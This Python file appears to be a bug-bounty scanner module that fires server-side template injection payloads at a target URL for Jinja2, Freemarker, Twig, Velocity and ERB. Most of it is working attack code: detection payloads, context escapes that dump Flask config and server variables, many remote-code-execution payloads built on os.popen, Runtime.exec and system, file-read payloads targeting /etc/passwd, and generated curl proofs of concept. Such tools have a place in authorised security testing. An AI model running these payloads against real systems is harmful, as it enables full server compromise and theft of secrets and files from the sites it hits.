"""
Server-Side Template Injection (SSTI) Tester Agent

Tests for SSTI across Jinja2, Freemarker, Twig, Velocity, ERB template engines.

Comprehensive testing includes:
- Template engine detection (error signatures, behavior markers)
- Basic injection detection (math eval, string multiplication)
- Context escape testing (config access, internal objects)
- Remote Code Execution (RCE) attempts
- File read/write operations
- Multiple payload generation strategies
- Database-driven testing with payload reuse

Tests 5 major template engines:
1. Jinja2 (Python/Flask)
2. Freemarker (Java/Spring)
3. Twig (PHP/Symfony)
4. Velocity (Java/Apache)
5. ERB (Ruby/Rails)

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import time
import random
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import quote, unquote, urlencode, urlparse
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class TemplateEngine(Enum):
    """Template engine types"""
    JINJA2 = "jinja2"
    FREEMARKER = "freemarker"
    TWIG = "twig"
    VELOCITY = "velocity"
    ERB = "erb"
    UNKNOWN = "unknown"


class SSTITestType(Enum):
    """SSTI test categories"""
    DETECTION = "detection"
    CONTEXT_ESCAPE = "context_escape"
    CODE_EXECUTION = "code_execution"
    FILE_READ = "file_read"
    FILE_WRITE = "file_write"
    RCE = "rce"


@dataclass
class SSTIPayload:
    """SSTI payload definition"""
    payload: str
    engine: TemplateEngine
    test_type: SSTITestType
    expected_output: Optional[str] = None
    expected_pattern: Optional[str] = None
    description: str = ""
    severity: str = "high"


@dataclass
class SSTIFinding:
    """SSTI vulnerability finding"""
    url: str
    parameter: str
    method: str
    engine: TemplateEngine
    test_type: SSTITestType
    payload: str
    evidence: str
    context: str
    severity: str
    impact: str
    exploitation_path: List[str]
    poc: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        """Convert finding to dictionary"""
        return {
            'url': self.url,
            'parameter': self.parameter,
            'method': self.method,
            'engine': self.engine.value,
            'test_type': self.test_type.value,
            'payload': self.payload,
            'evidence': self.evidence,
            'context': self.context,
            'severity': self.severity,
            'impact': self.impact,
            'exploitation_path': self.exploitation_path,
            'poc': self.poc,
            'timestamp': self.timestamp
        }


class TemplateDetector:
    """Detects template engine types from responses"""

    # Detection signatures for each engine
    SIGNATURES = {
        TemplateEngine.JINJA2: {
            'error_patterns': [
                r'jinja2\.exceptions',
                r'TemplateSyntaxError',
                r'UndefinedError',
                r'jinja2\.runtime'
            ],
            'behavior_markers': [
                ('{{7*7}}', '49'),
                ("{{7*'7'}}", '7777777'),
                ('{{config}}', 'Config')
            ]
        },
        TemplateEngine.FREEMARKER: {
            'error_patterns': [
                r'freemarker\.core',
                r'FreeMarker template error',
                r'InvalidReferenceException',
                r'TemplateException'
            ],
            'behavior_markers': [
                ('${7*7}', '49'),
                ("${7*'7'}", '7777777'),
                ('<#assign x=7*7>${x}', '49')
            ]
        },
        TemplateEngine.TWIG: {
            'error_patterns': [
                r'Twig_Error',
                r'Twig\\\\Error',
                r'Twig template error',
                r'Unknown ".*" filter'
            ],
            'behavior_markers': [
                ('{{7*7}}', '49'),
                ("{{7*'7'}}", '7777777'),
                ('{{dump()}}', 'array')
            ]
        },
        TemplateEngine.VELOCITY: {
            'error_patterns': [
                r'org\.apache\.velocity',
                r'VelocityException',
                r'ParseErrorException',
                r'MethodInvocationException'
            ],
            'behavior_markers': [
                ('#set($x=7*7)$x', '49'),
                ('$class', 'org.apache.velocity'),
            ]
        },
        TemplateEngine.ERB: {
            'error_patterns': [
                r'SyntaxError.*erb',
                r'ActionView::Template::Error',
                r'erb.*compilation error',
                r'ERB::.*Error'
            ],
            'behavior_markers': [
                ('<%= 7*7 %>', '49'),
                ("<%= 7*'7' %>", '7777777'),
            ]
        }
    }

    def detect_engine(self, responses: List[Dict]) -> TemplateEngine:
        """
        Detect template engine from responses.

        Args:
            responses: List of response dicts with 'body', 'headers', 'payload' keys

        Returns:
            Detected TemplateEngine enum
        """
        scores = {engine: 0 for engine in TemplateEngine}

        for response in responses:
            body = response.get('body', '')
            headers = response.get('headers', {})

            # Check error patterns
            for engine, sig in self.SIGNATURES.items():
                for pattern in sig['error_patterns']:
                    if re.search(pattern, body, re.IGNORECASE):
                        scores[engine] += 3

            # Check behavior markers
            payload = response.get('payload', '')
            for engine, sig in self.SIGNATURES.items():
                for test_payload, expected in sig['behavior_markers']:
                    if payload == test_payload and expected in body:
                        scores[engine] += 5

            # Check server headers
            server = headers.get('server', '').lower()
            x_powered_by = headers.get('x-powered-by', '').lower()

            if 'flask' in server or 'werkzeug' in server:
                scores[TemplateEngine.JINJA2] += 2
            elif 'tomcat' in server or 'jetty' in server:
                scores[TemplateEngine.FREEMARKER] += 1
                scores[TemplateEngine.VELOCITY] += 1
            elif 'php' in x_powered_by:
                scores[TemplateEngine.TWIG] += 1
            elif 'passenger' in server or 'puma' in server:
                scores[TemplateEngine.ERB] += 2

        # Return engine with highest score
        max_score = max(scores.values())
        if max_score > 0:
            for engine, score in scores.items():
                if score == max_score and engine != TemplateEngine.UNKNOWN:
                    return engine

        return TemplateEngine.UNKNOWN


class PayloadGenerator:
    """Generates SSTI payloads for various engines and test types"""

    def __init__(self):
        self.detector = TemplateDetector()
        self.random_marker = self._generate_marker()

    def _generate_marker(self) -> str:
        """Generate unique marker for detection"""
        return f"SSTI{random.randint(10000000, 99999999)}"

    def get_detection_payloads(self) -> List[SSTIPayload]:
        """Get basic detection payloads for all engines"""
        payloads = []
        marker = self.random_marker

        # Jinja2 detection
        payloads.extend([
            SSTIPayload(
                payload="{{7*7}}",
                engine=TemplateEngine.JINJA2,
                test_type=SSTITestType.DETECTION,
                expected_output="49",
                description="Jinja2 math expression"
            ),
            SSTIPayload(
                payload=f"{{{{'{marker}'*3}}}}",
                engine=TemplateEngine.JINJA2,
                test_type=SSTITestType.DETECTION,
                expected_output=marker*3,
                description="Jinja2 string multiplication"
            ),
            SSTIPayload(
                payload=f"{{{{''.join(['{marker}'])}}}}",
                engine=TemplateEngine.JINJA2,
                test_type=SSTITestType.DETECTION,
                expected_output=marker,
                description="Jinja2 list join"
            )
        ])

        # Freemarker detection
        payloads.extend([
            SSTIPayload(
                payload="${7*7}",
                engine=TemplateEngine.FREEMARKER,
                test_type=SSTITestType.DETECTION,
                expected_output="49",
                description="Freemarker math expression"
            ),
            SSTIPayload(
                payload=f"<#assign x='{marker}'>${{x}}",
                engine=TemplateEngine.FREEMARKER,
                test_type=SSTITestType.DETECTION,
                expected_output=marker,
                description="Freemarker variable assignment"
            )
        ])

        # Twig detection
        payloads.extend([
            SSTIPayload(
                payload="{{7*7}}",
                engine=TemplateEngine.TWIG,
                test_type=SSTITestType.DETECTION,
                expected_output="49",
                description="Twig math expression"
            ),
            SSTIPayload(
                payload=f"{{{{'{marker}'*3}}}}",
                engine=TemplateEngine.TWIG,
                test_type=SSTITestType.DETECTION,
                expected_output=marker*3,
                description="Twig string multiplication"
            )
        ])

        # Velocity detection
        payloads.extend([
            SSTIPayload(
                payload="#set($x=7*7)$x",
                engine=TemplateEngine.VELOCITY,
                test_type=SSTITestType.DETECTION,
                expected_output="49",
                description="Velocity math expression"
            ),
            SSTIPayload(
                payload=f"#set($x='{marker}')$x",
                engine=TemplateEngine.VELOCITY,
                test_type=SSTITestType.DETECTION,
                expected_output=marker,
                description="Velocity variable assignment"
            )
        ])

        # ERB detection
        payloads.extend([
            SSTIPayload(
                payload="<%= 7*7 %>",
                engine=TemplateEngine.ERB,
                test_type=SSTITestType.DETECTION,
                expected_output="49",
                description="ERB math expression"
            ),
            SSTIPayload(
                payload=f"<%= '{marker}'*3 %>",
                engine=TemplateEngine.ERB,
                test_type=SSTITestType.DETECTION,
                expected_output=marker*3,
                description="ERB string multiplication"
            )
        ])

        # Polyglot payloads
        payloads.extend([
            SSTIPayload(
                payload="${{<%[%'\"}}{{7*7}}",
                engine=TemplateEngine.UNKNOWN,
                test_type=SSTITestType.DETECTION,
                expected_output="49",
                description="Template polyglot"
            ),
            SSTIPayload(
                payload="${7*7}{{7*7}}<%= 7*7 %>",
                engine=TemplateEngine.UNKNOWN,
                test_type=SSTITestType.DETECTION,
                expected_pattern=r"49",
                description="Multi-engine polyglot"
            )
        ])

        return payloads

    def get_context_escape_payloads(self, engine: TemplateEngine) -> List[SSTIPayload]:
        """Get context escape payloads for specific engine"""
        payloads = []

        if engine == TemplateEngine.JINJA2:
            payloads.extend([
                SSTIPayload(
                    payload="{{config}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"SECRET_KEY|DEBUG",
                    description="Access Flask config object",
                    severity="high"
                ),
                SSTIPayload(
                    payload="{{self._TemplateReference__context}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"'(request|config|session)'",
                    description="Access template context",
                    severity="high"
                ),
                SSTIPayload(
                    payload="{{request.environ}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"SERVER_NAME|HTTP_HOST",
                    description="Access request environment",
                    severity="high"
                ),
                SSTIPayload(
                    payload="{{[].__class__.__base__.__subclasses__()}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"<class",
                    description="List all subclasses",
                    severity="critical"
                )
            ])

        elif engine == TemplateEngine.FREEMARKER:
            payloads.extend([
                SSTIPayload(
                    payload='<#assign classloader=object?api.class.protectionDomain.classLoader>${classloader}',
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"ClassLoader",
                    description="Access ClassLoader",
                    severity="critical"
                ),
                SSTIPayload(
                    payload='${.version}',
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"\d+\.\d+\.\d+",
                    description="Get Freemarker version",
                    severity="low"
                )
            ])

        elif engine == TemplateEngine.TWIG:
            payloads.extend([
                SSTIPayload(
                    payload="{{_self.env}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"Twig.*Environment",
                    description="Access Twig environment",
                    severity="high"
                ),
                SSTIPayload(
                    payload="{{_self.env.getCache()}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"(cache|Cache)",
                    description="Access cache object",
                    severity="medium"
                ),
                SSTIPayload(
                    payload="{{app.request.server.all|join(',')}}",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"HTTP_|SERVER_",
                    description="Dump server variables",
                    severity="high"
                )
            ])

        elif engine == TemplateEngine.VELOCITY:
            payloads.extend([
                SSTIPayload(
                    payload='#set($str=$class.inspect("java.lang.String").type)$str',
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"class java.lang.String",
                    description="Access String class",
                    severity="high"
                ),
                SSTIPayload(
                    payload='$class',
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"ClassTool",
                    description="Access ClassTool",
                    severity="critical"
                )
            ])

        elif engine == TemplateEngine.ERB:
            payloads.extend([
                SSTIPayload(
                    payload="<%= self %>",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"#<.*>",
                    description="Access self object",
                    severity="medium"
                ),
                SSTIPayload(
                    payload="<%= self.methods %>",
                    engine=engine,
                    test_type=SSTITestType.CONTEXT_ESCAPE,
                    expected_pattern=r"\[.*:.*\]",
                    description="List available methods",
                    severity="high"
                )
            ])

        return payloads

    def get_rce_payloads(self, engine: TemplateEngine, command: str = "id") -> List[SSTIPayload]:
        """Get RCE payloads for specific engine"""
        payloads = []

        if engine == TemplateEngine.JINJA2:
            # Method 1: Via config
            payloads.append(SSTIPayload(
                payload=f"{{{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via config object",
                severity="critical"
            ))

            # Method 2: Via request
            payloads.append(SSTIPayload(
                payload=f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('{command}').read()}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via request object",
                severity="critical"
            ))

            # Method 3: Via subclasses
            payloads.append(SSTIPayload(
                payload=f"{{{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('{command}').read()}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via subprocess.Popen subclass",
                severity="critical"
            ))

            # Method 4: Via cycler
            payloads.append(SSTIPayload(
                payload=f"{{{{cycler.__init__.__globals__.os.popen('{command}').read()}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via cycler object",
                severity="critical"
            ))

            # Method 5: Via lipsum
            payloads.append(SSTIPayload(
                payload=f"{{{{lipsum.__globals__['os'].popen('{command}').read()}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via lipsum function",
                severity="critical"
            ))

        elif engine == TemplateEngine.FREEMARKER:
            # Method 1: Execute object
            payloads.append(SSTIPayload(
                payload=f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{command}')}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via Execute utility",
                severity="critical"
            ))

            # Method 2: ObjectConstructor
            payloads.append(SSTIPayload(
                payload=f"<#assign oc='freemarker.template.utility.ObjectConstructor'?new()>${{oc('java.lang.ProcessBuilder','{command}').start()}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via ObjectConstructor",
                severity="critical"
            ))

            # Method 3: Direct Runtime
            payloads.append(SSTIPayload(
                payload=f"${{''['class'].forName('java.lang.Runtime').getRuntime().exec('{command}')}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via Runtime.exec",
                severity="critical"
            ))

        elif engine == TemplateEngine.TWIG:
            # Method 1: filter function
            payloads.append(SSTIPayload(
                payload=f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('{command}')}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via undefined filter callback",
                severity="critical"
            ))

            # Method 2: map filter
            payloads.append(SSTIPayload(
                payload=f"{{{{{{'_self.env.registerUndefinedFilterCallback':'system'}}|map|sort('{command}')}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via map filter",
                severity="critical"
            ))

            # Method 3: filter with system
            payloads.append(SSTIPayload(
                payload=f"{{{{['{command}']|filter('system')}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via filter system",
                severity="critical"
            ))

            # Method 4: sort with passthru
            payloads.append(SSTIPayload(
                payload=f"{{{{['{command}','']|sort('passthru')|join}}}}",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via sort passthru",
                severity="critical"
            ))

        elif engine == TemplateEngine.VELOCITY:
            # Method 1: Runtime.exec
            payloads.append(SSTIPayload(
                payload=f"#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{command}'))$ex",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via Runtime.exec",
                severity="critical"
            ))

            # Method 2: ProcessBuilder
            payloads.append(SSTIPayload(
                payload=f"#set($pb=$class.inspect('java.lang.ProcessBuilder').type)#set($arr=$class.inspect('java.lang.String').type.split('{command}'))$pb.newInstance($arr).start()",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via ProcessBuilder",
                severity="critical"
            ))

        elif engine == TemplateEngine.ERB:
            # Method 1: system
            payloads.append(SSTIPayload(
                payload=f"<%= system('{command}') %>",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via system()",
                severity="critical"
            ))

            # Method 2: backticks
            payloads.append(SSTIPayload(
                payload=f"<%= `{command}` %>",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via backticks",
                severity="critical"
            ))

            # Method 3: IO.popen
            payloads.append(SSTIPayload(
                payload=f"<%= IO.popen('{command}').readlines() %>",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via IO.popen",
                severity="critical"
            ))

            # Method 4: exec
            payloads.append(SSTIPayload(
                payload=f"<%= exec('{command}') %>",
                engine=engine,
                test_type=SSTITestType.RCE,
                description="RCE via exec()",
                severity="critical"
            ))

        return payloads

    def get_file_read_payloads(self, engine: TemplateEngine, path: str = "/etc/passwd") -> List[SSTIPayload]:
        """Get file read payloads for specific engine"""
        payloads = []

        if engine == TemplateEngine.JINJA2:
            payloads.extend([
                SSTIPayload(
                    payload=f"{{{{get_flashed_messages.__globals__.__builtins__.open('{path}').read()}}}}",
                    engine=engine,
                    test_type=SSTITestType.FILE_READ,
                    description="File read via builtins.open",
                    severity="high"
                ),
                SSTIPayload(
                    payload=f"{{{{config.__class__.__init__.__globals__['os'].popen('cat {path}').read()}}}}",
                    engine=engine,
                    test_type=SSTITestType.FILE_READ,
                    description="File read via os.popen",
                    severity="high"
                )
            ])

        elif engine == TemplateEngine.FREEMARKER:
            payloads.append(SSTIPayload(
                payload=f"<#assign is=object?api.class.getResourceAsStream('{path}')>${{is.getText()}}",
                engine=engine,
                test_type=SSTITestType.FILE_READ,
                description="File read via getResourceAsStream",
                severity="high"
            ))

        elif engine == TemplateEngine.TWIG:
            payloads.extend([
                SSTIPayload(
                    payload=f"{{{{source('{path}')}}}}",
                    engine=engine,
                    test_type=SSTITestType.FILE_READ,
                    description="File read via source()",
                    severity="high"
                ),
                SSTIPayload(
                    payload=f"{{{{['cat {path}']|filter('system')}}}}",
                    engine=engine,
                    test_type=SSTITestType.FILE_READ,
                    description="File read via system filter",
                    severity="high"
                )
            ])

        elif engine == TemplateEngine.ERB:
            payloads.extend([
                SSTIPayload(
                    payload=f"<%= File.open('{path}').read %>",
                    engine=engine,
                    test_type=SSTITestType.FILE_READ,
                    description="File read via File.open",
                    severity="high"
                ),
                SSTIPayload(
                    payload=f"<%= IO.read('{path}') %>",
                    engine=engine,
                    test_type=SSTITestType.FILE_READ,
                    description="File read via IO.read",
                    severity="high"
                )
            ])

        return payloads


class SSTITester:
    """Main SSTI testing agent"""

    # Common file paths to test
    UNIX_FILES = ['/etc/passwd', '/etc/hosts']
    WINDOWS_FILES = ['c:\\windows\\win.ini']

    def __init__(self, target_url: str, parameters: Dict[str, str],
                 method: str = "GET", target: Optional[str] = None,
                 timeout: int = 10):
        """
        Initialize SSTI tester.

        Args:
            target_url: Target URL to test
            parameters: Dictionary of parameters to test
            method: HTTP method (GET or POST)
            target: Target identifier for database (default: extracted from URL)
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.parameters = parameters
        self.method = method.upper()
        self.timeout = timeout
        self.findings: List[SSTIFinding] = []
        self.injection_points: List[Dict] = []
        self.payload_gen = PayloadGenerator()
        self.detector = TemplateDetector()

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

    def run_all_tests(self) -> List[SSTIFinding]:
        """
        Run all SSTI tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'ssti_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting SSTI testing on {self.target_url}...{Style.RESET_ALL}")
        print(f"[*] Method: {self.method}")
        print(f"[*] Parameters: {list(self.parameters.keys())}")

        # Step 1: Detect template engine
        engine = self._detect_template_engine()
        print(f"[*] Detected engine: {engine.value}")

        # Step 2: Test for basic injection
        if self._test_basic_injection(engine):
            print(f"{Fore.GREEN}[+] Basic template injection confirmed{Style.RESET_ALL}")

            # Step 3: Test context escape
            if self._test_context_escape(engine):
                print(f"{Fore.GREEN}[+] Context escape successful{Style.RESET_ALL}")

                # Step 4: Attempt RCE
                self._test_rce(engine)

                # Step 5: Attempt file operations
                self._test_file_operations(engine)

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'ssti_tester',
            findings_count=len(self.findings),
            duration_seconds=0,
            output={'engine': engine.value, 'findings': len(self.findings)}
        )

        print(f"{Fore.CYAN}[*] Testing complete. Found {len(self.findings)} issues.{Style.RESET_ALL}")
        return self.findings

    def _detect_template_engine(self) -> TemplateEngine:
        """Detect template engine type from responses"""
        detection_payloads = self.payload_gen.get_detection_payloads()
        responses = []

        for param_name, param_value in self.parameters.items():
            for payload_obj in detection_payloads[:15]:  # Test subset
                test_params = self.parameters.copy()
                test_params[param_name] = payload_obj.payload

                response = self._send_request(test_params)
                if response:
                    response['payload'] = payload_obj.payload
                    response['parameter'] = param_name
                    responses.append(response)

                    # Check for immediate match
                    if payload_obj.expected_output:
                        if payload_obj.expected_output in response['body']:
                            self.injection_points.append({
                                'parameter': param_name,
                                'engine': payload_obj.engine,
                                'payload': payload_obj.payload
                            })

                    time.sleep(0.1)

        return self.detector.detect_engine(responses)

    def _test_basic_injection(self, engine: TemplateEngine) -> bool:
        """Test basic template injection"""
        detection_payloads = self.payload_gen.get_detection_payloads()

        # Filter payloads for detected engine or use polyglots
        relevant_payloads = [
            p for p in detection_payloads
            if p.engine == engine or p.engine == TemplateEngine.UNKNOWN
        ]

        for param_name in self.parameters.keys():
            for payload_obj in relevant_payloads:
                test_params = self.parameters.copy()
                test_params[param_name] = payload_obj.payload

                response = self._send_request(test_params)
                if not response:
                    continue

                # Check for expected output
                if payload_obj.expected_output:
                    if payload_obj.expected_output in response['body']:
                        finding = SSTIFinding(
                            url=self.target_url,
                            parameter=param_name,
                            method=self.method,
                            engine=engine,
                            test_type=SSTITestType.DETECTION,
                            payload=payload_obj.payload,
                            evidence=f"Expected output '{payload_obj.expected_output}' found in response",
                            context=response['body'][:500],
                            severity="high",
                            impact="Server-Side Template Injection allows execution of template directives",
                            exploitation_path=[
                                "1. Basic injection confirmed",
                                "2. Attempt context escape",
                                "3. Escalate to RCE"
                            ],
                            poc=self._generate_poc(param_name, payload_obj.payload)
                        )
                        self.findings.append(finding)
                        return True

                # Check for expected pattern
                if payload_obj.expected_pattern:
                    if re.search(payload_obj.expected_pattern, response['body']):
                        finding = SSTIFinding(
                            url=self.target_url,
                            parameter=param_name,
                            method=self.method,
                            engine=engine,
                            test_type=SSTITestType.DETECTION,
                            payload=payload_obj.payload,
                            evidence=f"Pattern '{payload_obj.expected_pattern}' matched in response",
                            context=response['body'][:500],
                            severity="high",
                            impact="Server-Side Template Injection detected",
                            exploitation_path=["Basic injection confirmed"],
                            poc=self._generate_poc(param_name, payload_obj.payload)
                        )
                        self.findings.append(finding)
                        return True

                time.sleep(0.1)

        return False

    def _test_context_escape(self, engine: TemplateEngine) -> bool:
        """Test context escape capabilities"""
        escape_payloads = self.payload_gen.get_context_escape_payloads(engine)

        for injection_point in self.injection_points:
            param_name = injection_point['parameter']

            for payload_obj in escape_payloads:
                test_params = self.parameters.copy()
                test_params[param_name] = payload_obj.payload

                response = self._send_request(test_params)
                if not response:
                    continue

                # Check for pattern match
                if payload_obj.expected_pattern:
                    match = re.search(payload_obj.expected_pattern, response['body'], re.IGNORECASE)
                    if match:
                        finding = SSTIFinding(
                            url=self.target_url,
                            parameter=param_name,
                            method=self.method,
                            engine=engine,
                            test_type=SSTITestType.CONTEXT_ESCAPE,
                            payload=payload_obj.payload,
                            evidence=f"Context escape successful: {match.group(0)}",
                            context=response['body'][:500],
                            severity=payload_obj.severity,
                            impact=f"Template context escape via {payload_obj.description}",
                            exploitation_path=[
                                "1. Template injection confirmed",
                                "2. Context escape successful",
                                "3. Access to internal objects",
                                "4. Potential RCE"
                            ],
                            poc=self._generate_poc(param_name, payload_obj.payload)
                        )
                        self.findings.append(finding)
                        return True

                time.sleep(0.1)

        return False

    def _test_rce(self, engine: TemplateEngine):
        """Test Remote Code Execution"""
        marker = f"SSTI{random.randint(1000000, 9999999)}"
        command = f"echo {marker}"

        rce_payloads = self.payload_gen.get_rce_payloads(engine, command)

        for injection_point in self.injection_points:
            param_name = injection_point['parameter']

            for payload_obj in rce_payloads:
                test_params = self.parameters.copy()
                test_params[param_name] = payload_obj.payload

                response = self._send_request(test_params)
                if not response:
                    continue

                # Check if marker appears in response
                if marker in response['body']:
                    finding = SSTIFinding(
                        url=self.target_url,
                        parameter=param_name,
                        method=self.method,
                        engine=engine,
                        test_type=SSTITestType.RCE,
                        payload=payload_obj.payload,
                        evidence=f"Command execution confirmed: marker '{marker}' found in response",
                        context=response['body'][:500],
                        severity="critical",
                        impact="Remote Code Execution via SSTI - Full server compromise possible",
                        exploitation_path=[
                            "1. Template injection confirmed",
                            "2. Context escape successful",
                            "3. RCE achieved",
                            f"4. Method: {payload_obj.description}"
                        ],
                        poc=self._generate_rce_poc(param_name, engine)
                    )
                    self.findings.append(finding)

                    print(f"{Fore.RED}[!] RCE CONFIRMED via {payload_obj.description}{Style.RESET_ALL}")
                    return

                time.sleep(0.2)

    def _test_file_operations(self, engine: TemplateEngine):
        """Test file read/write operations"""
        test_files = self.UNIX_FILES + self.WINDOWS_FILES

        for test_file in test_files:
            read_payloads = self.payload_gen.get_file_read_payloads(engine, test_file)

            for injection_point in self.injection_points:
                param_name = injection_point['parameter']

                for payload_obj in read_payloads:
                    test_params = self.parameters.copy()
                    test_params[param_name] = payload_obj.payload

                    response = self._send_request(test_params)
                    if not response:
                        continue

                    # Check for file signatures
                    if self._detect_file_content(response['body'], test_file):
                        finding = SSTIFinding(
                            url=self.target_url,
                            parameter=param_name,
                            method=self.method,
                            engine=engine,
                            test_type=SSTITestType.FILE_READ,
                            payload=payload_obj.payload,
                            evidence=f"File read successful: {test_file}",
                            context=response['body'][:500],
                            severity="high",
                            impact="Arbitrary file read via SSTI",
                            exploitation_path=[
                                "1. Template injection confirmed",
                                "2. File read capability confirmed",
                                f"3. Successfully read {test_file}"
                            ],
                            poc=self._generate_poc(param_name, payload_obj.payload)
                        )
                        self.findings.append(finding)

                        print(f"{Fore.YELLOW}[+] File read confirmed: {test_file}{Style.RESET_ALL}")
                        return

                    time.sleep(0.1)

    def _detect_file_content(self, body: str, filepath: str) -> bool:
        """Detect if response contains file content"""
        signatures = {
            '/etc/passwd': [r'root:.*:0:0:', r'bin:.*:/bin/', r'daemon:'],
            '/etc/hosts': [r'127\.0\.0\.1.*localhost', r'::1.*localhost'],
            'c:\\windows\\win.ini': [r'\[fonts\]', r'\[extensions\]', r'for Windows']
        }

        if filepath in signatures:
            for pattern in signatures[filepath]:
                if re.search(pattern, body, re.IGNORECASE):
                    return True

        return False

    def _send_request(self, parameters: Dict) -> Optional[Dict]:
        """Send HTTP request and return response"""
        if not REQUESTS_AVAILABLE:
            return None

        try:
            if self.method == "GET":
                response = requests.get(
                    self.target_url,
                    params=parameters,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                response = requests.post(
                    self.target_url,
                    data=parameters,
                    timeout=self.timeout,
                    allow_redirects=True
                )

            return {
                'status': response.status_code,
                'body': response.text,
                'headers': dict(response.headers)
            }
        except Exception as e:
            return None

    def _generate_poc(self, param: str, payload: str) -> str:
        """Generate proof of concept"""
        if self.method == "GET":
            return f"curl '{self.target_url}?{param}={quote(payload)}'"
        else:
            return f"curl -X POST '{self.target_url}' -d '{param}={quote(payload)}'"

    def _generate_rce_poc(self, param: str, engine: TemplateEngine) -> str:
        """Generate RCE proof of concept"""
        rce_examples = {
            TemplateEngine.JINJA2: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            TemplateEngine.FREEMARKER: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            TemplateEngine.TWIG: "{{['id']|filter('system')}}",
            TemplateEngine.VELOCITY: "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex",
            TemplateEngine.ERB: "<%= system('id') %>"
        }

        payload = rce_examples.get(engine, "{{7*7}}")

        if self.method == "GET":
            return f"curl '{self.target_url}?{param}={quote(payload)}'"
        else:
            return f"curl -X POST '{self.target_url}' -d '{param}={quote(payload)}'"

    def get_findings(self) -> List[SSTIFinding]:
        """Get all findings"""
        return self.findings

    def get_findings_by_severity(self, severity: str) -> List[SSTIFinding]:
        """Get findings by severity level"""
        return [f for f in self.findings if f.severity == severity]


# Integration function for BountyHound
def run_ssti_tests(target_url: str, parameters: Dict[str, str],
                   method: str = "GET", target: Optional[str] = None) -> Dict:
    """
    Run SSTI tests on target.

    Args:
        target_url: URL to test
        parameters: Dictionary of parameters to test
        method: HTTP method (GET or POST)
        target: Target identifier for database

    Returns:
        Dictionary with findings and statistics
    """
    tester = SSTITester(target_url, parameters, method=method, target=target)
    findings = tester.run_all_tests()

    return {
        'findings': [f.to_dict() for f in findings],
        'stats': {
            'total_findings': len(findings),
            'critical': len([f for f in findings if f.severity == 'critical']),
            'high': len([f for f in findings if f.severity == 'high']),
            'medium': len([f for f in findings if f.severity == 'medium']),
            'engines_tested': list(set(f.engine.value for f in findings))
        }
    }
